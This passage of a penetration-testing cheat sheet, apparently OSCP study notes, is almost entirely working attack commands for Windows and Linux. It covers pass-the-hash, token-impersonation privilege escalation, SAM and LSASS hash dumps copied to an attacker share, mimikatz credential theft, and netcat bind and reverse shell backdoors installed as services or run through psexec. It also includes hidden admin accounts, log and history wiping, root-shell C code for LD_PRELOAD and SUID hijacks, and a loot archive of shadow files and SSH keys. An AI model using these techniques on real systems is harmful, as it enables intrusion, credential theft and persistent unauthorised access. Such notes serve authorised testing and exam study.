## 6.6. Windows Pass-The-Hash Attacks

There are lots of ways to pass the hash on windows, giving you access as a user
with just the hash of their creds.

See [Dumping Hashes from Windows](#735-dumping-hashes-from-windows) for techniques
on grabbing Windows password hashes.

Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here.

```sh
# Get remote powershell shell by passing the hash
# install: sudo gem install evil-winrm
evil-winrm.rb -i $VICTIM_IP -u username -H NTHASH

# Run remote command as SYSTEM (note colon before NT hash)
impacket-psexec -hashes :NTHASH administrator@$VICTIM_IP whoami
# omit the command to get interactive shell

impacket-wmiexec DOMAIN/Administrator@$VICTIM_IP -hashes LMHASH:NTHASH

# execute remote command as Admin (IP MUST GO LAST!)
crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP

# spawn cmd.exe shell on remote windows box
# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe

# other options: xfreerdp, smbclient
```

## 6.7. Windows Token Impersonation

These require the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to
be enabled. This is the case when you have a shell running as
"nt authority\local service"

### 6.7.1. Windows Token Impersonation with RoguePotato

```sh
# on kali box, set up socat redirector for roguepotato to bounce off of
sudo socat tcp-listen:135,reuseaddr,fork tcp:WINBOX_IP:9999
# also start another netcat listener to catch the system shell
sudo nc -vlnp 443
```

```bat
:: in windows reverse shell with "SeImpersonatePrivilege"
:: or "SeAssignPrimaryTokenPrivilege" enabled
RoguePotato.exe -r KALI_IP -e "C:\Users\Public\revshell.exe" -l 9999
:: and bingo! you should have system on the listener you set up!
```

### 6.7.2. Windows Token Impersonation with PrintSpoofer

First set up a netcat listener on Kali to catch the reverse shell.

```bat
:: on windows reverse shell with "SeImpersonatePrivilege"
:: or "SeAssignPrimaryTokenPrivilege" enabled
PrintSpoofer.exe -c "C:\Users\Public\revshell.exe" -i
```

### 6.7.3. Windows Service Escalation - Registry

Vulnerable when:

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# shows NT AUTHORITY\INTERACTIVE has FullControl
```

`windows_service.c`:
```c
// compile with:
// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
    system("whoami > c:\\temp\\service.txt");
    return 0;
}

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv)
{
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler);
    Run();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus (hStatus,  &ServiceStatus);
    return;
}
```

Compile with `x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe`, then
upload winsvc.exe to `%temp%`.

```bat
:: overwrite regsvc execution path
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d %temp%\winsvc.exe /f
:: restart regsvc
sc start regsvc
```

## 6.8. Compiling Windows Binaries on Linux

You can use `mingw` to compile C files.

[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE for C# and .NET.

## 6.9. Windows Passwords & Hashes

Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)

### 6.9.1. Finding Windows Passwords in Files

```bat
:: search specific filetypes for "password"
findstr /spin password *.txt *.xml *.ini *.config

:: Searching all files (lots of output)
findstr /spin "password" *.*

:: find files that might have credentials in them
cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
dir /b /s *passw* *creds* *credential*
dir /b /s *.config *.conf *.cfg
```

#### 6.9.1.1. Files with Passwords on Windows

Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
an AES-encrypted password, but the static key is published on the MSDN website.

```bat
:: Unattend files
%SYSTEMDRIVE%\unattend.txt
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

:: Group Policy Object files
:: decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)
%WINDIR%\SYSVOL\Groups.xml
%WINDIR%\SYSVOL\scheduledtasks.xml
%WINDIR%\SYSVOL\Services.xml

:: sysprep
%SYSTEMDRIVE%\sysprep.inf
%SYSTEMDRIVE%\sysprep\sysprep.xml

:: less likely, still worth looking
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`

### 6.9.2. Windows Passwords in Registry

```bat
:: Windows autologin credentials (32-bit and 64-bit versions)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

:: VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

:: SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

:: Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

:: Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 6.9.3. Getting Saved Wifi Passwords on Windows

```bat
:: show all saved wifi networks
netsh wlan show profiles

:: get password of specific network 'profilename'
wlan show profile profilename key=clear

:: PEAP wifi network passwords are stored in registry
reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv

:: Display all keys, values and data under the PEAP profiles:
reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
```

### 6.9.4. Dumping Hashes from Windows

```bat
:: Grab them from the registry
reg save hklm\sam %TEMP%\sam.hiv /y
reg save hklm\system %TEMP%\system.hiv /y
reg save hklm\security %TEMP%\security.hiv /y
copy %TEMP%\sam.hiv \\192.168.119.144\share
copy %TEMP%\system.hiv \\192.168.119.144\share
copy %TEMP%\security.hiv \\192.168.119.144\share

:: clean up stolen registry files
del %TEMP%\*.hiv

:: Grab the backups from disk
copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.hiv
copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.hiv
copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.hiv
```

Then, on attack box:

```sh
# using impacket secretsdump.py (security.hiv optional)
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
```

Alternatively, you can grab the hashes directly from LSASS.exe memory using
Sysinternals tools:

```bat
procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
copy %TEMP%\lsass.mem \\192.168.119.144\share
```

#### 6.9.4.1. Dumping Hashes from Windows Registry Backups

Look for these files:

```bat
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

%SYSTEMROOT%\ntds\ntds.dit
```

#### 6.9.4.2. Dumping Hashes from Windows Domain Controller

DCSync Attack

```sh
# requires authentication
impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
```

### 6.9.5. Using mimikatz to dump hashes and passwords

[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

```bat
.\mimikatz.exe
:: enable full debug privileges to have access to system memory
privilege::debug
:: elevate to system
token::elevate
:: get hashes and try to print plaintext passwords
sekurlsa::logonpasswords
:: tries to extract plaintext passwords from lsass memory
sekurlsa::wdigest
:: dump hashes from SAM
lsadump::sam
:: list all available kerberos tickets
sekurlsa::tickets
:: Get just the krbtgt kerberos tikcket
sekurlsa::krbtgt
:: List Current User's kerberos tickets
kerberos::list

:: get google chrome saved credentials
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## 6.10. Windows Files of Interest

```bat
:: GPG keys
dir /s /b /a C:\users\*.gpg
:: usually under C:\Users\*\AppData\Roaming\gnupg\

:: KeePass databases:
dir *.kdb /a /b /s

%WINDIR%\System32\drivers\etc\hosts
```

## 6.11. Lateral Movement in Windows Active Directory

### 6.11.1. Quick Active Directory Enumeration

This script will provide a quick listing of all computers, users, service
accounts, groups and memberships on an Active Directory domain.

This script was written by Cones, modifying the example code provided in the
PWK course materials.

```powershell
$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
$q=("LDAP://"+($d.PdcRoleOwner).Name+"/DC="+($d.Name.Replace('.',',DC=')));
$s=New-Object System.DirectoryServices.DirectorySearcher([ADSI]$q);
$s.SearchRoot=(New-Object System.DirectoryServices.DirectoryEntry);
write-host "-- COMPUTERS --";
$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
write-host "-- USERS --";
$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
write-host "-- SERVICES --";
$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
write-host "-- GROUPS --";
$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
write-host "-- MEMBERSHIP --";
function _r {
  param($o,$m);
  if ($o.Properties.member -ne $null) {
    $lm=[System.Collections.ArrayList]@();
    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
    $lm=$lm|select -unique;
    $m.add((New-Object psobject -Property @{
      OU = $o.Properties.name[0]
      M = [string]::Join(", ",$lm)
    }));
    $lm | ?{
      $s.filter=[string]::Format("(name={0})",$_);
      $s.FindAll()|?{_r $_ $m | out-null};
    }
  }
}
$m=[System.Collections.ArrayList]@();
$s.FindAll()|?{_r $_ $m | out-null};
$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
```

## 6.12. Miscellaneous Windows Commands

cmd.exe:

```bat
:: restart/reboot the machine now
shutdown /r /t 0

:: infinite loop of command with 5s timeout between runs
for /l %n in () do @(
  @echo Working really hard...
  timeout /t 5 /nobreak > NUL
)

:: run regedit as SYSTEM (to view protected keys)
psexec.exe -i -s regedit.exe
:: check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\

:: recursively list files with Alternate Data Streams
dir /s /r /a | find ":$DATA"
gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
:: print Alternate Data Stream to console
powershell get-content -path /path/to/stream/file  -stream STREAMNAME
:: hide a file in an Alternate Data Stream
type evil.exe > benign.dll:evil.exe
:: delete ADS from file
powershell remove-item -path /path/to/stream/file  -stream STREAMNAME

:: Check if OS is 64-bit
(wmic os get OSArchitecture)[2]

:: Set terminal to display ansi-colors
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
```

PowerShell:

```powershell
# determine if current powershell process is 64-bit
[System.Environment]::Is64BitProcess

# determine if OS is 64-bit (various methods)
[System.Environment]::Is64BitOperatingSystem
(Get-WMIObject Win32_OperatingSystem).OSArchitecture
(Get-WMIObject CIM_OperatingSystem).OSArchitecture
(Get-WMIObject Win32_Processor).AddressWidth
[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit

# Base64 Decode
[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))

# Zip a directory using Powershell 3.0 (Win8)
Add-Type -A 'System.IO.Compression.FileSystem';
[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')

# Zip a directory using Powershell 5.0 (Win10)
Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
```

## 6.13. Windows Persistence

### 6.13.1. Remote SYSTEM Backdoor

These techniques require having Admin credentials for the target machine.

#### 6.13.1.1. Using Windows Services

```bat
:: You must establish SMB session with admin creds first!!
net use \\VICTIM_NAME [PASSWORD] /u:Administrator
:: or mount an smb share on the target:
net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator

:: open a backdoor netcat bind-shell with system privileges on a remote host
sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"

:: start the service
sc \\VICTIM_NAME start scvhost

:: delete the service
sc \\VICTIM_NAME delete scvhost
```

#### 6.13.1.2. Using PSExec

NOTE: SysInternals PSExec leaves a copy of the service on the machine after
you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
The Metasploit module and nmap NSE script clean up the service for you.

```bat
:: '-c' passes copy of command to remote systsem even if not already present
:: '-s' runs command as systsem
:: '-d' runs command in detached mode. Use if you want PSExec to run something
:: in the background (won't wait for process to finish, nor passs input/output
:: back to caller).
psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
:: If username and password are omitted, psexec uses current user's creds on
:: the remote machine.
```

#### 6.13.1.3. Using Scheduled Tasks

```bat
:: schtasks ("/ru system" runs as system)
schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
:: frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle

:: query schtasks
schtasks /query /s VICTIM_IP

:: delete schtask ('/f' to force)
schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME

:: at (deprecated on newer machines, but still should work)
at \\VICTIM_IP HH:MM[A|P] COMMAND

:: query at
at \\VICTIM_IP
```

### 6.13.2. Remote Admin Backdoor via WMIC

```bat
:: create admin bind-shell backdoor. Use '-d' for it to run without window
wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"

:: delete the wmic process
wmic process where name="nc.exe" delete
```

### 6.13.3. Add RDP User

```bat
net user derp herpaderp /add
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /ADD
:: enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
:: delete user
net user derp /del
:: disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

### 6.13.4. Connect to Windows RDP

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
```

### 6.13.5. Change Windows Domain Credentials

If you want to change the password of a user on a windows domain:

```powershell
Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
```

### 6.13.6. Create Windows Backdoor Service

```bat
:: Creates a SYSTEM bind-shell listening on port 54321
sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -d -L -p 54321 -e c:\windows\system32\cmd.exe"
sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\ncat.exe -lk -p 54321 -e c:\windows\system32\cmd.exe"
:: Alternative: add \\computername after sc to do it remotely

:: start backdoor service
sc start bdsvc
:: or
net start bdsvc

:: stop and delete backdoor service
sc delete bdsvc
```

# 7. Linux

## 7.1. Upgrading to Interactive Shell

Use this if you have a netcat-based reverse shell (on Linux box).

```sh
# In reverse shell ##########
python3 'import pty; pty.spawn("/bin/bash")'
# windows
c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'

# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell

# In local shell ##########
# Get TTY rows/cols for later:
stty size # prints "rows cols"
# ignore hotkeys in the local shell and get back to remote shell
stty raw -echo; fg # hit enter TWICE after this

# In reverse shell ##########
# set correct size for remote shell (ROWS and COLS from stty size)
stty rows ROWS cols COLS
# enable terminal colors
export TERM=xterm-256color
# reload bash to apply TERM env var
exec /bin/bash
```

## 7.2. Basic Linux Post-Exploit Enumeration

```sh
# minimum commands
unset HISTFILE
uname -a
cat /etc/*release
set                # or 'env'
ps -ef wwf
ifconfig -a        # or ip a
netstat -untap
w
last


# unset history (shell command logging)
unset HISTFILE
export HISTFILE=
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
export HISTCONTROL=ignorespace
history -c

# make sure terminal environment is good, if not working right
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
export TERM=xterm-256color

# current user
id
whoami

# system hostname
hostname -f
cat /etc/hostname

# OS Version info
uname -a
cat /etc/*release
cat /etc/*lease*
cat /etc/issue

# check sudo permissions
sudo -l

# check for CVE-2021-3156 (Heap-based buffer overflow in sudo, privesc)
# *check only works if you are in sudoers file. Affects all legacy versions
# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
# Exploit works even if user isn't in sudoers file.
sudoedit -s /
# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git

# running processes
ps -ef wwf

# Credentials
ls -l /home/*/.ssh/id*  # ssh keys
ls -AlR /home/*/.gnupg  # PGP keys
ls -l /tmp/krb5*  # Kerberos tickets

# list all users, groups
grep -vE "nologin|false" /etc/passwd
cat /etc/passwd
cat /etc/group
cat /etc/master.passwd
cat /etc/shadow  # need to be root, get list of hashed passwords
# pretty print relevant data
grep -v '#' /etc/passwd | awk -F: 'BEGIN{print "USERNAME PASSWD UID GID HOMEDIR SHELL"; print "-------- ------ --- --- ------- -----"} {print $1 " " $2 " " $3 " " $4 " " $6 " " $7}' | column -t

# Currently signed in users
w
who -a

# Recently signed in users
last  # better info running as root, may need "-a" switch

# mounted filesystems
mount
cat /etc/fstab
cat /etc/auto?master

# check this user's cron jobs
crontab -l
# look at system-wide crontab
cat /etc/crontab
# pay attention to PATH in /etc/crontab and any bad file perms of scripts

# check for running cron jobs
grep "CRON" /var/log/cron.log

# list every user's cron jobs
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null

# find world-writable files
# -mount doesn't descend into mounted file systems like /proc
# -xdev is alternative equivalent to -mount on various systems
find / -mount -type f -perm -o+w 2>/dev/null

# find all SUID and SGID binaries
find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null

# shell history
cat /home/*/.*history
grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null

# Interesting files
find / -type f -name *.gpg
find / -type f -name id_rsa*

###############################
## NETWORK  ###################
###############################

# IP addresses, interfaces
ip a
ifconfig -a
cat /etc/network/interfaces

# Routing info
ip r
route -n
netstat -r

# arp table
arp -a

# DNS resolver info
cat /etc/resolv.conf

# resolved hosts
cat /etc/hosts

# Network connections
netstat -tulnp  # all listening ports
netstat -anop  # all connection types, with timers
lsof -Pni  # established connections
cat /proc/net/*  # lots of output??

# iptables rules (must be root)
iptables -L -v -n
iptables -t nat -L -v -n  # NAT info
iptables-save  # saved iptables


##################################
## Software  #####################
##################################

# Info on installed packages
rpm -qa --last  # RedHat
yum list | grep installed  # CentOS/RedHat w/ Yum
apt list --installed  # Debain w/ Apt
dpkg -l  # Debian
pkg_info  # xBSD
pkginfo  # Solaris
ls -d /var/db/pkg/  # Gentoo
pacman -Q  # Arch
cat /etc/apt/sources.list  # Apt sources
ls -l /etc/yum.repos.d/  # Yum repos
cat /etc/yum.conf  # Yum config

# check version info of useful binaries
gcc -v  # compiler
ldd --version  # glibc version
python --version
python3 --version
perl -v
php -v
ruby -v
node -v
mysql --version

# See if other useful GTFO-bins are present
which awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip


####################################
## Miscellaneous  ##################
####################################

# kernel system messages since boot
dmesg

# processor and memory info
cat /proc/cpuinfo
cat /proc/meminfo

# Message of the Day
cat /etc/motd

# Get SELinux status
getenforce
```

## 7.3. Watching for Linux Process Changes

```sh
#!/bin/bash
# source: Ippsec nineveh walkthrough

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

## 7.4. Adding root user to /etc/shadow or /etc/passwd

```sh
# if /etc/shadow is writable
# generate new password
mkpasswd -m sha-512 password
# or
openssl passwd -1 -salt derp password
# edit /etc/shadow and overwrite hash of root with this one

# if /etc/passwd is writable
echo "derp:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
# alternatively
echo "derp:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
# pre-computed for password 'herpaderp':
echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd

# can also add generated password between the first and second colon of root user
```

## 7.5. Escalating via sudo binaries

Many binaries let you run commands from within them. If you get limited `sudo`
permissions for one of the binaries, you can escalate to root.

```sh
# check for sudo permissions
sudo -l
# if you see a binary with '(root) NOPASSWD ...' you might be in luck
# check the following website for escalation methods:
# https://gtfobins.github.io/#+sudo

# Example: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Example: find
sudo find . -exec /bin/sh \; -quit
```

## 7.6. LD_PRELOAD and LD_LIBRARY_PATH

For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
are inherited from the user's environment:
```
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// setresuid(0,0,0);
  setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

`library_path.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
  exit(0);
}
```

Usage:

```sh
# LD_PRELOAD
# compile malicious preload binary
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# use it to get root
sudo LD_PRELOAD=/tmp/preload.so program_name_here

# LD_LIBRARY_PATH
# see which shared libraries are used
ldd $(which apache2)
# compile malicious library as one of existing ones
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
# use it to get root
sudo LD_LIBRARY_PATH=/tmp apache2
# note, some ld-files work better than others, so try every option from ldd
# if the first attempt fails. May also need to alter file to hook function
# being called (must exactly match function signature)
```

## 7.7. SUID binaries

`inject.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

```sh
# find all root-owned SUID and GUID binaries
find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null

# look for access to file that doesn't exist, but we might control
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

# compile your inject file
gcc -shared -fPIC inject.c -o /path/to/hijacked.so

# run your binary
suid-so
```

You can also hijack system(3) calls in an executable where the binary path isn't
specified (PATH hijack). Look for clues using `strings` and `strace`, then replace
the binary in question with your own:

`hijack.c`
```c
/* Gets root shell
 * Compile (as root):
 * gcc -Wall pwn.c -o pwn && chmod u+s pwn
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
  return 0;
}
```

And invoke like so:
```sh
# compile
gcc hijack.c -o hijacked-binary-name

# inject onto PATH
PATH=.:$PATH victim-binary
```

In `bash` versions less than 4.2-048, you can even do PATH hijacks by exporting
functions that look like valid paths, and will get executed instead of the
binary at the real path:

```sh
# create a substitute for /usr/sbin/service
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
# then just run victim binary that executes /usr/sbin/service
```

For bash versions less than 4.4, you can also take advantage of the PS4 env var,
which is used to display debug information (debug mode when SHELLOPTS=xtrace).

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

## 7.8. Using NFS for Privilege Escalation

NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
something owned by root remotely is owned by root locally.

```sh
# check for NFS with root-squashing disabled (no_root_squash)
cat /etc/exports

# On Kali box:
sudo su   # switch to root
mkdir /tmp/nfs
mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
# Note: if mount fails, try without vers=2 option.
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# on victim machine
/tmp/shell.elf
```

## 7.9. Linux Kernel Exploits

### 7.9.1. Dirty Cow Linux Privesc

[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
is effective against Linux kernels 2.x through 4.x before 4.8.3.

```sh
# easiest if g++ avail
searchsploit -m 40847
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s

# Also good:
searchsploit -m 40839
```

## 7.10. Linux Files of Interest

```sh
# quick command to grab the goods
tar zcf loot.tar.gz \
/etc/passwd{,-} \
/etc/shadow{,-} \
/etc/ssh/ssh_config \
/etc/ssh/sshd_config \
/home/*/.ssh/id* \
/home/*/.ssh/authorized_keys* \
/home/*/.gnupg \
/root/.gnupg \
/root/.ssh/id* \
/root/.ssh/authorized_keys* \
/root/network-secret*.txt \
/root/proof.txt
```

## 7.11. Data Wrangling on Linux

Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
be able to quickly sift through it to get the parts you care about.

### 7.11.1. Awk & Sed

```sh
# grab lines of text between start and end delimiters.
awk '/PAT1/,/PAT2/' # includes start and end lines
awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
sed -n '/PAT1/,/PAT2/{//!p;}' FILE
sed '/PAT1/,/PAT2/!d;//d' FILE
```

## 7.12. Linux Persistence

### 7.12.1. Grant passwordless sudo access

Edit the `/etc/sudoers` file to have the following line:

```
myuser ALL=(ALL) NOPASSWD: ALL
```

### 7.12.2. Setting SUID bit

If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
you can use those to give yourself a root shell. This is a kind of privesc
backdoor.

```sh
sudo chmod u+s /bin/sh
```

# 8. Loot

## Sensitive Files

The following are some Linux files that have sensitive information that
are good to try to grab when you can (directory traversal, LFI, shell access).

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
/etc/motd
/etc/mysql/my.cnf
/proc/self/environ
/proc/version
/proc/cmdline
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
```


## 8.1. File Transfers

### 8.1.1. Netcat transfer

```sh
# start listening for download on port 9001
nc -nlvp 9001 > dump.txt
# upload file to IP via port 9001
nc $IP 9001 < file.txt
```

### 8.1.2. Curl transfers

```sh
